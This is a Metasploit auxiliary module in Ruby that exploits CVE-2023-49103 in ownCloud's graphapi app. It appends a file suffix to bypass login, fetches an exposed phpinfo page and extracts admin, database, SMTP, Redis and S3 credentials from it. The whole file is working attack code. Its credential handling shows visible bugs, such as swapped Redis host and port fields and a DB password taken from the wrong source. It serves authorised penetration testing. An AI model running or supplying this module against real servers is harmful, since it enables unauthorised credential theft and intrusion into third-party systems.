##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'ownCloud Phpinfo Reader',
        'Description' => %q{
          Docker containers of ownCloud compiled after February 2023, which have version 0.2.0 before 0.2.1 or 0.3.0 before 0.3.1 of the app `graph` installed
          contain a test file which prints `phpinfo()` to an unauthenticated user. A post file name must be appended to the URL to bypass the login filter.
          Docker may export sensitive environment variables including ownCloud, DB, redis, SMTP, and S3 credentials, as well as other host information.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die', # msf module
          'creacitysec', # original PoC
          'Ron Bowes', # research
          'random-robbie', # additional PoC work and research
          'Christian Fischer' # additional PoC work and research
        ],
        'References' => [
          [ 'URL', 'https://owncloud.com/security-advisories/disclosure-of-sensitive-credentials-and-configuration-in-containerized-deployments/'],
          [ 'URL', 'https://github.com/creacitysec/CVE-2023-49103'],
          [ 'URL', 'https://www.labs.greynoise.io//grimoire/2023-11-29-owncloud-redux/'],
          [ 'URL', 'https://www.rapid7.com/blog/post/2023/12/01/etr-cve-2023-49103-critical-information-disclosure-in-owncloud-graph-api/'],
          [ 'CVE', '2023-49103']
        ],
        'Targets' => [
          [ 'Automatic Target', {}]
        ],
        'DisclosureDate' => '2023-11-21',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )
    register_options(
      [
        Opt::RPORT(8080),
        OptString.new('TARGETURI', [ true, 'The URI of ownCloud', '/']),
        OptEnum.new('ROOT', [true, 'Root path to start with', 'all', ['all', '', 'owncloud'] ]),
        OptEnum.new('ENDFILE', [
          true, 'End path to append', 'all', [
            'all', 'css', 'js', 'svg', 'gif', 'png', 'html', 'ttf', 'woff', 'ico', 'jpg',
            'jpeg', 'json', 'properties', 'min.map', 'js.map', 'auto.map'
          ]
        ]),
      ]
    )
  end

  def roots
    if datastore['ROOT'] == 'all'
      return ['', 'owncloud']
    end

    datastore['ROOT']
  end

  def endfiles
    if datastore['ENDFILE'] == 'all'
      return [
        '.css', '.js', '.svg', '.gif', '.png', '.html', '.ttf', '.woff', '.ico', '.jpg',
        '.jpeg', '.json', '.properties', '.min.map', '.js.map', '.auto.map'
      ]
    end
    ".#{datastore['ENDFILE']}"
  end

  def field_regex(field)
    "<tr><td class=\"e\">#{field} <\/td><td class=\"v\">([^ ]+) <\/td><\/tr>"
  end

  def get_mappings
    {
      'License Key' => 'OWNCLOUD_LICENSE_KEY',
      'Hostname' => 'HOSTNAME',
      'Home' => 'HOME',
      'Server Root' => 'APACHE_DOCUMENT_ROOT',
      'PWD' => 'PWD',
      'SMTP Host' => 'OWNCLOUD_MAIL_SMTP_HOST',
      'SMTP Port' => 'OWNCLOUD_MAIL_SMTP_PORT',
      'SMTP Username' => 'OWNCLOUD_MAIL_SMTP_NAME',
      'SMTP Password' => 'OWNCLOUD_MAIL_SMTP_PASSWORD',
      'ownCloud Username' => 'OWNCLOUD_ADMIN_USERNAME',
      'ownCloud Password' => 'OWNCLOUD_ADMIN_PASSWORD',
      'ownCloud Server Port' => 'SERVER_PORT',
      'DB Host' => 'OWNCLOUD_DB_HOST',
      'DB Username' => 'OWNCLOUD_DB_USERNAME',
      'DB Password' => 'OWNCLOUD_DB_PASSWORD',
      'DB Name' => 'OWNCLOUD_DB_NAME',
      'DB Type' => 'OWNCLOUD_DB_TYPE',
      'Redis Host' => 'OWNCLOUD_REDIS_HOST',
      'Redis Port' => 'OWNCLOUD_REDIS_PORT',
      'Redis DB' => 'OWNCLOUD_REDIS_DB',
      'Redis Password' => 'OWNCLOUD_REDIS_PASSWORD',
      'ObjectStore Endpoint' => 'OWNCLOUD_OBJECTSTORE_ENDPOINT',
      'ObjectStore Region' => 'OWNCLOUD_OBJECTSTORE_REGION',
      'ObjectStore Secret' => 'OWNCLOUD_OBJECTSTORE_SECRET',
      'ObjectStore Key' => 'OWNCLOUD_OBJECTSTORE_KEY',
      'ObjectStore Bucket' => 'OWNCLOUD_OBJECTSTORE_BUCKET'
    }
  end

  def run
    found = false
    roots.each do |root|
      break if found

      endfiles.each do |endfile|
        url = normalize_uri(target_uri.path, root, 'apps', 'graphapi', 'vendor', 'microsoft', 'microsoft-graph', 'tests', 'GetPhpInfo.php', endfile)
        vprint_status("Checking: #{url}")
        res = send_request_cgi(
          'uri' => url
        )

        fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
        unless res.code == 200 && res.body.include?('phpinfo()')
          print_bad("Not Exploited - HTTP Status Code: #{res.code}")
          next
        end
        print_good("Found phpinfo page at: #{url}")

        # store page
        l = store_loot(
          'owncloud.phpinfo',
          'text/html',
          rhost,
          res.body,
          'phpinfo.html'
        )
        print_good("Loot stored to: #{l}")

        # process the page
        mappings = get_mappings
        extracted_values = {}
        mappings.each do |field_name, field|
          if res.body =~ /#{field_regex(field)}/
            extracted_values[field_name] = ::Regexp.last_match(1)
            print_good("#{field_name}: #{extracted_values[field_name]}")
          end
        end

        table = Rex::Text::Table.new(
          'Header' => 'Credentials',
          'Indent' => 2,
          'SortIndex' => 0,
          'Columns' => [ 'Type', 'Host', 'Username', 'Password', 'Notes']
        )

        if extracted_values['SMTP Password']
          credential_data = {
            protocol: 'tcp',
            workspace_id: myworkspace_id,
            service_name: 'SMTP',
            origin_type: :service,
            module_fullname: fullname,
            status: Metasploit::Model::Login::Status::UNTRIED,
            private_data: extracted_values['SMTP Password'],
            private_type: :password
          }
          credential_data[:username] = extracted_values['SMTP Username'] if extracted_values['SMTP Username']
          credential_data[:address] = extracted_values['SMTP Host'].nil? ? '127.0.0.1' : extracted_values['SMTP Host']
          credential_data[:port] = extracted_values['SMTP Port'].nil? ? 25 : extracted_values['SMTP Port']

          create_credential(credential_data)
          table << ['SMTP', "#{credential_data[:address]}:#{credential_data[:port]}", credential_data[:username], extracted_values['SMTP Password'], '']
        end

        if extracted_values['ownCloud Password']
          credential_data = {
            protocol: 'tcp',
            port: rport,
            address: rhost,
            workspace_id: myworkspace_id,
            service_name: 'ownCloud',
            origin_type: :service,
            module_fullname: fullname,
            status: Metasploit::Model::Login::Status::UNTRIED,
            private_data: extracted_values['ownCloud Password'],
            private_type: :password
          }
          credential_data[:username] = extracted_values['ownCloud Username'].nil? ? '' : extracted_values['ownCloud Username']

          create_credential(credential_data)
          table << ['ownCloud', "#{rhost}:#{rport}", credential_data[:username], extracted_values['ownCloud Password'], '']
        end

        ## DB
        if extracted_values['DB Password']
          credential_data = {
            protocol: 'tcp',
            port: extracted_values['DB Host'].split(':')[1],
            address: extracted_values['DB Host'].split(':')[0],
            workspace_id: myworkspace_id,
            service_name: extracted_values['DB Type'],
            origin_type: :service,
            module_fullname: fullname,
            status: Metasploit::Model::Login::Status::UNTRIED,
            private_data: datastore['DB Password'],
            private_type: :password
          }
          credential_data[:username] = extracted_values['DB Password'].nil? ? '' : extracted_values['DB Username']
          create_credential(credential_data)
          table << [extracted_values['DB Type'], "#{rhost}:#{rport}", credential_data[:username], extracted_values['DB Password'], '']
        end

        ## REDIS
        if extracted_values['Redis Password']
          credential_data = {
            protocol: 'tcp',
            port: extracted_values['Redis Host'],
            address: extracted_values['Redis Port'],
            workspace_id: myworkspace_id,
            service_name: 'redis',
            origin_type: :service,
            module_fullname: fullname,
            status: Metasploit::Model::Login::Status::UNTRIED,
            private_data: extracted_values['Redis Password'],
            private_type: :password
          }

          create_credential(credential_data)
          table << ['redis', "#{extracted_values['Redis Host']}:#{extracted_values['Redis Port']}", '', extracted_values['Redis Password'], '']
        end

        ## OBJECTSTORE
        if extracted_values['ObjectStore Secret'] && extracted_values['ObjectStore Key']
          table << ['S3 Object Store', extracted_values['ObjectStore Region'], "Key: #{extracted_values['ObjectStore Key']}", "Secret: #{extracted_values['ObjectStore Secret']}", "Endpoint: #{extracted_values['ObjectStore Endpoint']}, Bucket: #{extracted_values['ObjectStore Bucket']}"]
        end

        print_good(table.to_s)
        found = true
        break # no need to keep going, we already got what we wanted
      end
    end
  end
end
